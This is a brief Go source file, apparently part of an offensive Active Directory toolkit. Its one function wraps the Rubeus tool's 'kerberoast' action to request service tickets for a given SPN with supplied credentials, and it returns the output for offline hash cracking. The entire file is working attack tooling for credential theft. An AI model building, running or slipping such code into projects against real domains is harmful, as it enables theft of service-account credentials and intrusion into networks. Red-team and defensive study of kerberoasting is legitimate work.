// pkg/kerberos/kerberos.go
package kerberos

import (
	"bytes"
	"fmt"
	"os/exec"
)

// GetServiceTicket demande un ticket de service pour un SPN donné en utilisant Rubeus.
func GetServiceTicket(username, domain, password, spn string) (string, error) {
	cmd := exec.Command("Rubeus.exe", "kerberoast", "/spn:"+spn, "/user:"+username, "/domain:"+domain, "/password:"+password, "/outfile:-")
	var out bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &stderr

	err := cmd.Run()
	if err != nil {
		return "", fmt.Errorf("failed to get service ticket: %v, stderr: %s", err, stderr.String())
	}

	return out.String(), nil
}
